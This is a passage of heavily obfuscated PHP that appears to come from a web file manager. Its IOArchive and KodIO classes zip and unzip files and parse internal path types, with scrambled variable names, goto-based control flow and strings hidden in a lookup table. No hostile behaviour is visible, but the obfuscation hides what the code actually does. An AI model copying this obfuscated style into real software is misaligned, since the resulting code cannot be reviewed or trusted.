$C¬ÏÛ’ÚªÖ[8]); } $a‰ÀôÚîæè = $aÒ„Ëèó¥->getPath($a‰ÀôÚîæè); if (isset($aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[984]])) { $a‰ÀôÚîæè = $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[984]]; } goto A†ƒ©’Ñ; A’î…¨¨»°: $aÒ„Ëèó¥ = self::$driverCache[$dô¶¼¨‹¯ˆ]; $aÒ„Ëèó¥->pathDriver = $CøÅÇ°¨‰Ã; $aÒ„Ëèó¥->pathBase = $C¬ÏÛ’ÚªÖ[33]; goto FÏ©ŠøãŠ¨; A†ƒ©’Ñ: $aÒ„Ëèó¥->path = $a‰ÀôÚîæè; return $aÒ„Ëèó¥; goto cªÅÑŒ‚£¤; cªÅÑŒ‚£¤: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $aÃÚá„Ñìë; if (!$aÃÚá„Ñìë) { $AƒÄÏëÅ°ó = IO::init($_SERVER[í™][8]); } return $AƒÄÏëÅ°ó; } private static function iconvSystem($bïà§ÅÁ¾¿) { return self::local()->iconvSystem($bïà§ÅÁ¾¿); } private static function iconvApp($B©´“­ßË) { return self::local()->iconvApp($B©´“­ßË); } public static function zip($F½æÀ–ĞğÉ, $AŸ®íêõ«ù = "\x7a\x69\160", $FŠ°Š—ğª = '', $d”Œßäİ«Å = REPEAT_RENAME) { goto a“…ö¢£Ï; Aâ«­½ˆ…ß: $EËÙ»Şµ¸± = !1; if (!$FŠ°Š—ğª && $eƒÔµ•Ğø->getType() == $cè†ïîÊƒ[102]) { $aêùËçé‡ø = self::zipFileList($F½æÀ–ĞğÉ); } else { $EËÙ»Şµ¸± = $FŠ°Š—ğª ? $FŠ°Š—ğª : TEMP_FILES . $cè†ïîÊƒ[1011] . time() . rand_string(8) . $cè†ïîÊƒ[8]; mk_dir($EËÙ»Şµ¸±); $aêùËçé‡ø = self::zipFileList($F½æÀ–ĞğÉ, $EËÙ»Şµ¸±); } $e³áƒÖå‹³ = $fÏÎÚ¤ğå—[$cè†ïîÊƒ[28]]; goto a»•‹µ‰­·; a»•‹µ‰­·: if (count($aêùËçé‡ø) > 1) { $D˜ÑÚ—ì‚Ü = IO::info(IO::pathFather($fÏÎÚ¤ğå—[$cè†ïîÊƒ[75]])); $e³áƒÖå‹³ = $D˜ÑÚ—ì‚Ü[$cè†ïîÊƒ[28]]; } $Dä„ôˆë = $EËÙ»Şµ¸±; if (!$Dä„ôˆë) { $Dä„ôˆë = get_path_father($fÏÎÚ¤ğå—[$cè†ïîÊƒ[75]]); $d«È¶‹¦Æ¤ = IO::info($Dä„ôˆë); if (!$d«È¶‹¦Æ¤[$cè†ïîÊƒ[189]]) { show_json(LNG($cè†ïîÊƒ[1012]), !1); } } goto EÎ´é³ğ·Ô; Eàˆ¼Ê÷¯ò: if ($FŠ°Š—ğª || !$EËÙ»Şµ¸±) { if ($EËÙ»Şµ¸± && strstr($EËÙ»Şµ¸±, TEMP_FILES)) { $f÷µ”ÖÄÖ = $aêùËçé‡ø = array(); recursion_dir($Dä„ôˆë, $f÷µ”ÖÄÖ, $aêùËçé‡ø, 0); foreach ($f÷µ”ÖÄÖ as $EÇ›†‚©È) { del_dir($EÇ›†‚©È); } foreach ($aêùËçé‡ø as $cç‰„ñ“»‡) { if ($cç‰„ñ“»‡ == $e±’¶°ãš) { continue; } del_file($cç‰„ñ“»‡); } } return $e÷Ö„Ï‹å; } $cÚ¢ó»‘’÷ = self::pathFather($fÏÎÚ¤ğå—[$cè†ïîÊƒ[75]]); $e°íğÑ÷ï = self::move($e÷Ö„Ï‹å, $cÚ¢ó»‘’÷, $d”Œßäİ«Å); goto f¤ŸÛËå£Í; f¤ŸÛËå£Í: if (!$e°íğÑ÷ï) { del_dir($EËÙ»Şµ¸±); show_json(LNG($cè†ïîÊƒ[1013]), !1); } del_dir($EËÙ»Şµ¸±); return $e°íğÑ÷ï; goto A›‘òğ¸äˆ; EÎ´é³ğ·Ô: $e÷Ö„Ï‹å = $Dä„ôˆë . $e³áƒÖå‹³ . $cè†ïîÊƒ[91] . $AŸ®íêõ«ù; $e÷Ö„Ï‹å = get_filename_auto($e÷Ö„Ï‹å, $cè†ïîÊƒ[33], $d”Œßäİ«Å); $e±’¶°ãš = self::iconvSystem($e÷Ö„Ï‹å); goto FÎß’¿Ø‡ğ; a“…ö¢£Ï: $cè†ïîÊƒ =& $_SERVER[í™]; $eƒÔµ•Ğø = self::init($F½æÀ–ĞğÉ[0][$cè†ïîÊƒ[75]]); $fÏÎÚ¤ğå— = self::info($F½æÀ–ĞğÉ[0][$cè†ïîÊƒ[75]]); goto Aâ«­½ˆ…ß; FÎß’¿Ø‡ğ: foreach ($aêùËçé‡ø as $b…Ê†¦‰Çæ => $dòâå’›Ú×) { $aêùËçé‡ø[$b…Ê†¦‰Çæ] = self::iconvSystem($dòâå’›Ú×); } KodArchive::create($e±’¶°ãš, $aêùËçé‡ø); if (!IO::exist($e÷Ö„Ï‹å)) { if ($EËÙ»Şµ¸±) { del_dir($EËÙ»Şµ¸±); } show_json(LNG($cè†ïîÊƒ[1013]), !1); } goto Eàˆ¼Ê÷¯ò; A›‘òğ¸äˆ: } public static function unzip($fİë¼“«é‰, $CŠöô²¨ƒ = "\x72\x65\160\x6c\141\x63\145") { goto eõö†á’Èğ; DË°Õô¦½: mk_dir($bÌ°î²…Ï); $CÓ¨Ã…³Œ = self::fileExt($Cãíø«ìËè); $FĞ“¡Î¸Ø³ = $bÌ°î²…Ï . $C÷åˆˆŒÃ£[91] . $CÓ¨Ã…³Œ; goto b‚õ‘ªªß; eõö†á’Èğ: $C÷åˆˆŒÃ£ =& $_SERVER[í™]; $C®²¹í¸ø¡ = $fİë¼“«é‰[$C÷åˆˆŒÃ£[75]]; $a¬Ô¢Ê”¸ò = $fİë¼“«é‰[$C÷åˆˆŒÃ£[1014]]; goto C–åŒ„”Üæ; b‚õ‘ªªß: if (!@file_exists(self::iconvSystem($FĞ“¡Î¸Ø³))) { $Bé•šÅ‹Â = self::localFilePath($C®²¹í¸ø¡, $CÓ¨Ã…³Œ); $FĞ“¡Î¸Ø³ = $Bé•šÅ‹Â ? $Bé•šÅ‹Â : parent::download($C®²¹í¸ø¡, $FĞ“¡Î¸Ø³); } $FĞ“¡Î¸Ø³ = self::iconvSystem($FĞ“¡Î¸Ø³); $c«õßÊ‰ÄŠ = isset($fİë¼“«é‰[$C÷åˆˆŒÃ£[1016]]) ? $fİë¼“«é‰[$C÷åˆˆŒÃ£[1016]] : $C÷åˆˆŒÃ£[1017]; goto d½ò¼’¿; DˆÚÃù©²ñ: Hook::trigger($C÷åˆˆŒÃ£[1021], $bÌ°î²…Ï); recursion_dir($bÌ°î²…Ï, $føƒ‘ìÊ÷¸, $B’ÆÜù¹õ³, 0); $A—µ¦†“Î“ = array_merge($føƒ‘ìÊ÷¸, $B’ÆÜù¹õ³); goto bó†‰ÚÇÙ; bó†‰ÚÇÙ: foreach ($A—µ¦†“Î“ as $a¿§Æ–§˜) { $a¿§Æ–§˜ = self::iconvApp($a¿§Æ–§˜); self::move($a¿§Æ–§˜, $a¬Ô¢Ê”¸ò, $CŠöô²¨ƒ); } del_dir($bÌ°î²…Ï); if (!$Bé•šÅ‹Â) { del_file($FĞ“¡Î¸Ø³); } goto cµÂàò“ÑÚ; D‹äâ‚ñ: $A·¤Îí‹ƒ‹ = self::tmpFileName($Cãíø«ìËè); $bÌ°î²…Ï = TEMP_FILES . $A·¤Îí‹ƒ‹; del_dir($bÌ°î²…Ï); goto DË°Õô¦½; C–åŒ„”Üæ: if (!($Cãíø«ìËè = parent::info($C®²¹í¸ø¡))) { show_json(LNG($C÷åˆˆŒÃ£[1015]), !1); } if (!($A‡õÊìğíÉ = parent::infoFull($a¬Ô¢Ê”¸ò))) { $a¬Ô¢Ê”¸ò = parent::mkdir($a¬Ô¢Ê”¸ò); $A‡õÊìğíÉ = array($C÷åˆˆŒÃ£[75] => $a¬Ô¢Ê”¸ò); } else { if (isset($A‡õÊìğíÉ[$C÷åˆˆŒÃ£[369]]) && trim($A‡õÊìğíÉ[$C÷åˆˆŒÃ£[75]], $C÷åˆˆŒÃ£[8]) != trim($a¬Ô¢Ê”¸ò, $C÷åˆˆŒÃ£[8])) { $a½éˆŞ¶øÄ = KodIO::make($A‡õÊìğíÉ[$C÷åˆˆŒÃ£[463]]); $CƒášŒ¤•É = parent::fileNameAuto($a½éˆŞ¶øÄ, $A‡õÊìğíÉ[$C÷åˆˆŒÃ£[28]], REPEAT_RENAME_FOLDER, !0); $a¬Ô¢Ê”¸ò = parent::mkdir($a½éˆŞ¶øÄ . $CƒášŒ¤•É); $A‡õÊìğíÉ = array($C÷åˆˆŒÃ£[75] => $a¬Ô¢Ê”¸ò); } } $a¬Ô¢Ê”¸ò = $A‡õÊìğíÉ[$C÷åˆˆŒÃ£[75]]; goto D‹äâ‚ñ; d½ò¼’¿: $C“½»÷Î°¶ = KodArchive::extract($FĞ“¡Î¸Ø³, $bÌ°î²…Ï . $C÷åˆˆŒÃ£[8], $c«õßÊ‰ÄŠ); self::archiveExt(); if (!$C“½»÷Î°¶[$C÷åˆˆŒÃ£[1018]]) { show_json($C÷åˆˆŒÃ£[1019] . $C“½»÷Î°¶[$C÷åˆˆŒÃ£[1020]], !1); } goto DˆÚÃù©²ñ; cµÂàò“ÑÚ: return !0; goto A—ĞÚÅ§±; A—ĞÚÅ§±: } public static function unzipList($C´ƒÄÑ¤«) { goto fïµó˜ƒ‰†; cš“‰Ø¯ç: if (isset($a»¾ßŠàÂ)) { $c¾’ÒÃŒå³ = array($a»¾ßŠàÂ[$fÛçË‹Æ[75]], $a»¾ßŠàÂ[$fÛçË‹Æ[1022]], $a»¾ßŠàÂ[$fÛçË‹Æ[28]]); $A‚Äˆîƒ = md5(implode($fÛçË‹Æ[70], $c¾’ÒÃŒå³)) . $fÛçË‹Æ[91] . get_path_ext($a»¾ßŠàÂ[$fÛçË‹Æ[28]]); } else { $c¾’ÒÃŒå³ = array($E”ñõ¦–[$fÛçË‹Æ[28]], $E”ñõ¦–[$fÛçË‹Æ[75]], $E”ñõ¦–[$fÛçË‹Æ[77]]); $A‚Äˆîƒ = md5(implode($fÛçË‹Æ[70], $c¾’ÒÃŒå³)) . $fÛçË‹Æ[91] . $AÆ—ß¹ë¯Œ; } if ($Aâ® ãŒÔ == -1) { $AÆ‹à¬‰» = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\x56\151\145\167\57{$eì·à¯¿¯}\x2f{$A‚Äˆîƒ}\x2e\154\157\147"; $C’£Ö¸¨½ª = self::infoFull($AÆ‹à¬‰»); if ($C’£Ö¸¨½ª) { $AÆ‹à¬‰» = $C’£Ö¸¨½ª[$fÛçË‹Æ[75]]; $A„Şá¨‹Ö = self::getContent($AÆ‹à¬‰»); if ($A„Şá¨‹Ö) { $CÊ±†¹¥Çƒ = json_decode($A„Şá¨‹Ö, !0); if (count($CÊ±†¹¥Çƒ) >= $c†Å¶‡ÂŸì) { show_json(sprintf(LNG($fÛçË‹Æ[1024]), count($CÊ±†¹¥Çƒ)), !1); } return $CÊ±†¹¥Çƒ; } } else { $AÆ‹à¬‰» = self::mkfile($AÆ‹à¬‰»); } } $AÅ¡¾îÌÕå = TEMP_FILES . $eì·à¯¿¯; goto BŠ”²ƒŸ’„; BŠ”²ƒŸ’„: if (!is_dir($AÅ¡¾îÌÕå)) { mk_dir($AÅ¡¾îÌÕå); } $a¨™¥°ÁŠ = $AÅ¡¾îÌÕå . $fÛçË‹Æ[8] . $A‚Äˆîƒ; if (!@file_exists(self::iconvSystem($a¨™¥°ÁŠ))) { if (isset($a»¾ßŠàÂ)) { url_request($DĞõ©®áÕ, $fÛçË‹Æ[1025], $a¨™¥°ÁŠ); } else { $D©¦«ÅÊ‹Õ = self::localFilePath($DĞõ©®áÕ, $AÆ—ß¹ë¯Œ); $a¨™¥°ÁŠ = $D©¦«ÅÊ‹Õ ? $D©¦«ÅÊ‹Õ : self::download($DĞõ©®áÕ, $a¨™¥°ÁŠ); } } goto CöŒº¯Ñ³Ã; fïµó˜ƒ‰†: $fÛçË‹Æ =& $_SERVER[í™]; $DĞõ©®áÕ = $C´ƒÄÑ¤«[$fÛçË‹Æ[75]]; $Aâ® ãŒÔ = isset($C´ƒÄÑ¤«[$fÛçË‹Æ[1022]]) ? $C´ƒÄÑ¤«[$fÛçË‹Æ[1022]] : -1; goto eÄ¨ôÌ‡•ù; Dºƒ£ù¬Š…: return $CŒ¾¤Ğ‹Îİ[$fÛçË‹Æ[1020]]; goto CËš¹ˆ»¿‹; CöŒº¯Ñ³Ã: $a¨™¥°ÁŠ = self::iconvSystem($a¨™¥°ÁŠ); if ($Aâ® ãŒÔ >= 0) { $e¹šø¤™êã = isset($C´ƒÄÑ¤«[$fÛçË‹Æ[1026]]) ? $C´ƒÄÑ¤«[$fÛçË‹Æ[1026]] : !1; $d“‚–âÜß¢ = isset($C´ƒÄÑ¤«[$fÛçË‹Æ[28]]) ? $C´ƒÄÑ¤«[$fÛçË‹Æ[28]] : $fÛçË‹Æ[33]; KodArchive::filePreview($a¨™¥°ÁŠ, $Aâ® ãŒÔ, $e¹šø¤™êã, $d“‚–âÜß¢); self::archiveExt(); die; } $CŒ¾¤Ğ‹Îİ = KodArchive::listContent($a¨™¥°ÁŠ); goto B¦Ï˜òÜ–Ä; aƒî¸µŠĞ: $E”ñõ¦– = self::info($e—ã©ˆğª); $AÆ—ß¹ë¯Œ = self::fileExt($E”ñõ¦–); $eì·à¯¿¯ = self::tmpFileName($E”ñõ¦–); goto cš“‰Ø¯ç; Dç·åèé‰é: $CÊ±†¹¥Çƒ = json_encode($CŒ¾¤Ğ‹Îİ[$fÛçË‹Æ[1020]]); self::setContent($AÆ‹à¬‰», $CÊ±†¹¥Çƒ); if (count($CŒ¾¤Ğ‹Îİ[$fÛçË‹Æ[1020]]) >= $c†Å¶‡ÂŸì) { show_json(sprintf(LNG($fÛçË‹Æ[1024]), count($CŒ¾¤Ğ‹Îİ[$fÛçË‹Æ[1020]])), !1); } goto Dºƒ£ù¬Š…; eÄ¨ôÌ‡•ù: $c†Å¶‡ÂŸì = 50000; if (request_url_safe($DĞõ©®áÕ)) { $a»¾ßŠàÂ = parse_url_query($DĞõ©®áÕ); if (!isset($a»¾ßŠàÂ[$fÛçË‹Æ[75]])) { show_json($fÛçË‹Æ[1023], !1); } } $e—ã©ˆğª = isset($a»¾ßŠàÂ) ? $a»¾ßŠàÂ[$fÛçË‹Æ[75]] : $DĞõ©®áÕ; goto aƒî¸µŠĞ; B¦Ï˜òÜ–Ä: self::archiveExt(); del_dir($AÅ¡¾îÌÕå); if (!$CŒ¾¤Ğ‹Îİ[$fÛçË‹Æ[1018]]) { show_json($CŒ¾¤Ğ‹Îİ[$fÛçË‹Æ[1020]], !1); } goto Dç·åèé‰é; CËš¹ˆ»¿‹: } private static function fileExt($B˜í’ÜÁğä) { $F÷ƒ‚ÕöÆî =& $_SERVER[í™]; $C˜„Â·¦ = $B˜í’ÜÁğä[$F÷ƒ‚ÕöÆî[160]]; if ($C˜„Â·¦ == $F÷ƒ‚ÕöÆî[1027]) { $E’Š¸½àô = $F÷ƒ‚ÕöÆî[1028]; if (substr($B˜í’ÜÁğä[$F÷ƒ‚ÕöÆî[28]], -strlen($E’Š¸½àô)) == $E’Š¸½àô) { $C˜„Â·¦ = $F÷ƒ‚ÕöÆî[1029]; } } self::archiveExt($C˜„Â·¦); return $C˜„Â·¦; } private static function zipFileList($FÛ‹ªŸ†ˆ², $d‹¼šÄ¾äº = false) { $e‚á’‹ƒ²õ =& $_SERVER[í™]; $Cã©‡®Õ‡ = array(); foreach ($FÛ‹ªŸ†ˆ² as $bÔ£„ö°®) { $f¨ÑÃß×ƒŸ = $bÔ£„ö°®[$e‚á’‹ƒ²õ[75]]; if ($d‹¼šÄ¾äº) { $f¨ÑÃß×ƒŸ = self::copy($bÔ£„ö°®[$e‚á’‹ƒ²õ[75]], $d‹¼šÄ¾äº, $e‚á’‹ƒ²õ[726]); } if ($f¨ÑÃß×ƒŸ && self::local()->exist($f¨ÑÃß×ƒŸ)) { $Cã©‡®Õ‡[$bÔ£„ö°®[$e‚á’‹ƒ²õ[75]]] = $f¨ÑÃß×ƒŸ; } } if (!empty($Cã©‡®Õ‡)) { return array_values($Cã©‡®Õ‡); } show_json(LNG($e‚á’‹ƒ²õ[1030]), !1); } public static function tmpFileName($cµ…ñ àœ) { $bßà»£ÓÑí =& $_SERVER[í™]; $e£­Ç‹¥Ìó = array($cµ…ñ àœ[$bßà»£ÓÑí[28]], $cµ…ñ àœ[$bßà»£ÓÑí[75]], $cµ…ñ àœ[$bßà»£ÓÑí[77]], $cµ…ñ àœ[$bßà»£ÓÑí[461]]); return md5(implode($bßà»£ÓÑí[70], $e£­Ç‹¥Ìó)); } private static function localFilePath($dÏÇİ‚ï¨¶, $cŞñ¦©œ«ó) { goto b©øòÚá‡ï; Fç•Âîî‹Õ: if ($C—ˆˆ¤¡Ôõ[$eöŠ¤ÊÅ«¾[29]] == KodIO::KOD_SOURCE) { $aêòì· = Model($eöŠ¤ÊÅ«¾[734])->fileInfoGet(KodIO::sourceID($dÏÇİ‚ï¨¶)); if (!$aêòì·[$eöŠ¤ÊÅ«¾[75]]) { show_json($eöŠ¤ÊÅ«¾[1033], !1); } $dÏÇİ‚ï¨¶ = $aêòì·[$eöŠ¤ÊÅ«¾[75]]; } $CƒÅÎí—·Ñ = self::init($dÏÇİ‚ï¨¶); $eçßƒÅ±÷± = $CƒÅÎí—·Ñ->getType(); goto c¾­ŞÏ•ê°; b©øòÚá‡ï: $eöŠ¤ÊÅ«¾ =& $_SERVER[í™]; if ($cŞñ¦©œ«ó == $eöŠ¤ÊÅ«¾[1031] && strtoupper(substr(PHP_OS, 0, 3)) == $eöŠ¤ÊÅ«¾[1032]) { return !1; } $C—ˆˆ¤¡Ôõ = KodIO::parse($dÏÇİ‚ï¨¶); goto Fç•Âîî‹Õ; c¾­ŞÏ•ê°: if ($eçßƒÅ±÷± == $eöŠ¤ÊÅ«¾[102] || $eçßƒÅ±÷± == $eöŠ¤ÊÅ«¾[1034]) { if (!$CƒÅÎí—·Ñ->exist($CƒÅÎí—·Ñ->path)) { show_json(LNG($eöŠ¤ÊÅ«¾[101]), !1); } return $CƒÅÎí—·Ñ->path; } return !1; goto cƒ‡àæÇ„‚; cƒ‡àæÇ„‚: } private static function archiveExt($D×Ïğ¶¦‚š = '') { $GLOBALS[$_SERVER[í™][1035]] = $D×Ïğ¶¦‚š; } } class KodIO { const KOD_SOURCE = "\173\x73\157\165\162\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\162\122\145\x63\x79\143\154\x65\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\162\x46\151\154\145\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\x72\106\x69\x6c\x65\124\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\165\160\122\157\157\x74\x53\x65\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\x53\x68\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\162\x53\150\x61\162\145\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\162\x65\x54\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\x72\x65\x49\x74\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\x72\x65\111\x74\145\x6d\x4c\151\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\163\x65\141\162\143\150\175"; const KOD_BLOCK = "\173\x62\x6c\x6f\x63\153\x7d"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\122\145\156\143\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\x72\151\166\145\x72\x7d"; public static function typeList() { $C ˆÒ±ªİí =& $_SERVER[í™]; return array($C ˆÒ±ªİí[1036] => self::KOD_SOURCE, $C ˆÒ±ªİí[1037] => self::KOD_USER_RECYCLE, $C ˆÒ±ªİí[1038] => self::KOD_USER_FAV, $C ˆÒ±ªİí[1039] => self::KOD_USER_FILE_TAG, $C ˆÒ±ªİí[1040] => self::KOD_USER_FILE_TYPE, $C ˆÒ±ªİí[1041] => self::KOD_GROUP_ROOT_SELF, $C ˆÒ±ªİí[1042] => self::KOD_USER_SHARE, $C ˆÒ±ªİí[1043] => self::KOD_USER_SHARE_LINK, $C ˆÒ±ªİí[1044] => self::KOD_USER_SHARE_TO_ME, $C ˆÒ±ªİí[1045] => self::KOD_SHARE_ITEM, $C ˆÒ±ªİí[1046] => self::KOD_SHARE_LINK, $C ˆÒ±ªİí[1047] => self::KOD_SEARCH, $C ˆÒ±ªİí[1048] => self::KOD_BLOCK, $C ˆÒ±ªİí[1049] => self::KOD_IO, $C ˆÒ±ªİí[1050] => self::KOD_USER_RECENT, $C ˆÒ±ªİí[1051] => self::KOD_USER_DRIVER); } public static function parse($e½µÆ°óÉª) { goto c“”‚æŒìÑ; c“”‚æŒìÑ: $A¬Á‰ÙËÛõ =& $_SERVER[í™]; $e½µÆ°óÉª = self::clear($e½µÆ°óÉª); $c³Ü§øµ‚Ó = array_values(self::typeList()); goto b©×à‘ô™; f–îÊØõà×: $e‡ÏÄÚÏÍƒ = array($A¬Á‰ÙËÛõ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $B†ÜÒ¬Í[$A¬Á‰ÙËÛõ[1056]] = in_array($B†ÜÒ¬Í[$A¬Á‰ÙËÛõ[29]], $e‡ÏÄÚÏÍƒ); return $B†ÜÒ¬Í; goto b˜Êó¥ëÉÃ; b©×à‘ô™: preg_match($A¬Á‰ÙËÛõ[1052], $e½µÆ°óÉª, $EìÇÇ½¶Øƒ); $B†ÜÒ¬Í = array($A¬Á‰ÙËÛõ[388] => !1, $A¬Á‰ÙËÛõ[1053] => !1, $A¬Á‰ÙËÛõ[385] => !1, $A¬Á‰ÙËÛõ[75] => $e½µÆ°óÉª, $A¬Á‰ÙËÛõ[999] => !1, $A¬Á‰ÙËÛõ[998] => $A¬Á‰ÙËÛõ[33]); if (is_array($EìÇÇ½¶Øƒ) && count($EìÇÇ½¶Øƒ) == 5) { $Dìòºª—‰Ë = $A¬Á‰ÙËÛõ[1054] . $EìÇÇ½¶Øƒ[2] . $A¬Á‰ÙËÛõ[315]; if (in_array($Dìòºª—‰Ë, $c³Ü§øµ‚Ó)) { $B†ÜÒ¬Í[$A¬Á‰ÙËÛõ[999]] = $EìÇÇ½¶Øƒ[1]; $B†ÜÒ¬Í[$A¬Á‰ÙËÛõ[29]] = $Dìòºª—‰Ë; $B†ÜÒ¬Í[$A¬Á‰ÙËÛõ[1055]] = substr($Dìòºª—‰Ë, 1, -1); $B†ÜÒ¬Í[$A¬Á‰ÙËÛõ[367]] = $EìÇÇ½¶Øƒ[3]; } $B†ÜÒ¬Í[$A¬Á‰ÙËÛõ[998]] = $EìÇÇ½¶Øƒ[4]; } goto f–îÊØõà×; b˜Êó¥ëÉÃ: } public static function clear($D´Õ¥Í¾‹î) { goto a˜êŸ¯œ‰; f£é”ñ³Ï: $cƒ¨¯ñª = $FŸŒ×Ûœèí[1057]; if (substr($D´Õ¥Í¾‹î, 0, 3) == $FŸŒ×Ûœèí[1058]) { $D´Õ¥Í¾‹î = substr($D´Õ¥Í¾‹î, 3); } while (strstr($D´Õ¥Í¾‹î, $cƒ¨¯ñª)) { $D´Õ¥Í¾‹î = str_replace($cƒ¨¯ñª, $FŸŒ×Ûœèí[8], $D´Õ¥Í¾‹î); } goto f¡…ƒÈÁä§; f¡…ƒÈÁä§: $D´Õ¥Í¾‹î = preg_replace($FŸŒ×Ûœèí[1059], $FŸŒ×Ûœèí[8], $D´Õ¥Í¾‹î); if ($D´Õ¥Í¾‹î == $FŸŒ×Ûœèí[8]) { return $FŸŒ×Ûœèí[8]; } $D´Õ¥Í¾‹î = rtrim($D´Õ¥Í¾‹î, $FŸŒ×Ûœèí[8]); goto fª£ŠĞå¹é; a˜êŸ¯œ‰: $FŸŒ×Ûœèí =& $_SERVER[í™]; $D´Õ¥Í¾‹î = str_replace(array($FŸŒ×Ûœèí[978], $FŸŒ×Ûœèí[217]), $FŸŒ×Ûœèí[50], $D´Õ¥Í¾‹î); $D´Õ¥Í¾‹î = str_replace($FŸŒ×Ûœèí[93], $FŸŒ×Ûœèí[8], $D´Õ¥Í¾‹î); goto f£é”ñ³Ï; fª£ŠĞå¹é: return $D´Õ¥Í¾‹î; goto cÊÍù¿¤‹ï; cÊÍù¿¤‹ï: } public static function sourceID($D‚ ¸ƒ†µÊ) { $F¢éÎ¥­‘ =& $_SERVER[í™]; $a¶¸Ô­È® = self::parse($D‚ ¸ƒ†µÊ); if ($a¶¸Ô­È®[$F¢éÎ¥­‘[29]] !== self::KOD_SOURCE) { show_json(LNG($F¢éÎ¥­‘[1060]), !1); } return $a¶¸Ô­È®[$F¢éÎ¥­‘[367]]; } public static function make($DèÍ¢öé’Õ) { if (!$DèÍ¢öé’Õ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($DèÍ¢öé’Õ)); } public static function makeShare($FÕ˜”³Ä¾æ, $aœ‡Æ¸ÚÒ) { return self::makePath(self::KOD_SHARE_ITEM, $FÕ˜”³Ä¾æ, $aœ‡Æ¸ÚÒ); } public static function makeFileTypePath($b›ƒ¼óç·ø) { return self::makePath(self::KOD_USER_FILE_TYPE, $b›ƒ¼óç·ø); } public static function makeFileTagPath($aøÇ¶ª‘») { return self::makePath(self::KOD_USER_FILE_TAG, $aøÇ¶ª‘»); } public static function makePath($B¨Í®ĞÈØŠ, $fÕõï¨¡á = '', $f³…ã¸–øØ = '') { $DŸ±³±¸‘„ =& $_SERVER[í™]; $cå†œ›Êôñ = substr($B¨Í®ĞÈØŠ, 1, -1); $aÓá‘Í·¬¡ = $DŸ±³±¸‘„[1061] . $cå†œ›Êôñ . $DŸ±³±¸‘„[1062] . $fÕõï¨¡á . $DŸ±³±¸‘„[1063]; $aÓá‘Í·¬¡ = $f³…ã¸–øØ ? $aÓá‘Í·¬¡ . $f³…ã¸–øØ . $DŸ±³±¸‘„[8] : $aÓá‘Í·¬¡; return $aÓá‘Í·¬¡; } public static function hashPath($fÄÌèõÅ) { $EîÛ‚ ¸äÙ =& $_SERVER[í™]; $FŞ¼‰õôùØ = is_array($fÄÌèõÅ) ? $fÄÌèõÅ : IO::info($fÄÌèõÅ); $F¶‰ÚÜ¡ìÅ = _get($FŞ¼‰õôùØ, $EîÛ‚ ¸äÙ[1064], $EîÛ‚ ¸äÙ[33]); if (!$F¶‰ÚÜ¡ìÅ) { $A³î×½«¥ö = KodIO::parse($FŞ¼‰õôùØ[$EîÛ‚ ¸äÙ[75]]); if (!$A³î×½«¥ö[$EîÛ‚ ¸äÙ[29]]) { $F¶‰ÚÜ¡ìÅ = IO::hashSimple($FŞ¼‰õôùØ[$EîÛ‚ ¸äÙ[75]]); } } if (!$F¶‰ÚÜ¡ìÅ) { $F¶‰ÚÜ¡ìÅ = md5($FŞ¼‰õôùØ[$EîÛ‚ ¸äÙ[75]] . $FŞ¼‰õôùØ[$EîÛ‚ ¸äÙ[77]] . $FŞ¼‰õôùØ[$EîÛ‚ ¸äÙ[107]]); } return $F¶‰ÚÜ¡ìÅ; } public static function initSystemPath() { $FäŸ‚ÑªÎÓ =& $_SERVER[í™]; if (defined($FäŸ‚ÑªÎÓ[1065])) { return; } define($FäŸ‚ÑªÎÓ[1065], self::systemPath($FäŸ‚ÑªÎÓ[1066])); define($FäŸ‚ÑªÎÓ[1067], self::systemPath($FäŸ‚ÑªÎÓ[1068])); define($FäŸ‚ÑªÎÓ[1069], self::systemPath($FäŸ‚ÑªÎÓ[1070])); define($FäŸ‚ÑªÎÓ[1071], self::systemPath($FäŸ‚ÑªÎÓ[1072])); } private static function systemPath($FÑ¬ĞÈ¬Üç) { goto eµö–éÏ›ª; fä ìÁ¡í¶: if ($FõïÛÄóÑ¸) { return $FõïÛÄóÑ¸; } if ($FÑ¬ĞÈ¬Üç == $B®¾¼øã´[1066]) { $FõïÛÄóÑ¸ = self::make(Model($B®¾¼øã´[734])->systemRootPathAdd($B®¾¼øã´[1075])); } else { $FõïÛÄóÑ¸ = self::systemPath($B®¾¼øã´[1066]); $Aß“®ª“² = self::sourceID($FõïÛÄóÑ¸); $FõïÛÄóÑ¸ = self::make(Model($B®¾¼øã´[734])->mkdir($Aß“®ª“², $FÑ¬ĞÈ¬Üç)); } Model($B®¾¼øã´[1074])->set($Ağ¤³ÚÛ, $FõïÛÄóÑ¸); goto Báğî¯òµ™; eµö–éÏ›ª: $B®¾¼øã´ =& $_SERVER[í™]; $Ağ¤³ÚÛ = $B®¾¼øã´[1073] . ucfirst($FÑ¬ĞÈ¬Üç); $FõïÛÄóÑ¸ = Model($B®¾¼øã´[1074])->get($Ağ¤³ÚÛ); goto fä ìÁ¡í¶; Báğî¯òµ™: return $FõïÛÄóÑ¸; goto CÏÔŠ½Ÿˆò; CÏÔŠ½Ÿˆò: } public static function systemFolder($Eñ÷¦ôÁ Ú) { $BÓ¼¨†– = IO_PATH_SYSTEM_SOURCE . $Eñ÷¦ôÁ Ú; $c„Şã¬ò²Ù = Cache::get($BÓ¼¨†–); if (!$c„Şã¬ò²Ù) { $b—ÒŒ˜ÈØ = 